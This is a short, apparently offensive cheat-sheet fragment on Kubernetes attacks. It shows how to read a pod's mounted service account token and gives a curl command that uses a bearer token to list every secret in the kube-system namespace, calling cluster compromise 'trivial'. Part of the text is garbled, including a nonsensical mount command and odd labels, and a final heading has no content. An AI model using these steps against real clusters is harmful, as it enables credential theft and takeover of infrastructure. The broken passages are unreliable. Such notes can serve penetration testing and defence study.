## Service Token

> PODS (container-array) created by an auto-assigned, service-account. 
> A new volume is created by containing public access token for Kubernetes API. 
$ dir/volume -mount -all --api in POD 
```powershell
$ cat /var/run/secrets/kubernetes.io/serviceaccount/token
# kubectl-cluster-compromise 
# trivial, as it will use that service account token without additional prompting
```
## RBAC Configuration
### Listing Secrets
> An attacker that gains access to list secrets in the cluster that can use the following curl commands to get all secrets in "kube-system" namespace.
```powershell
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### Access Any Resource or Verb
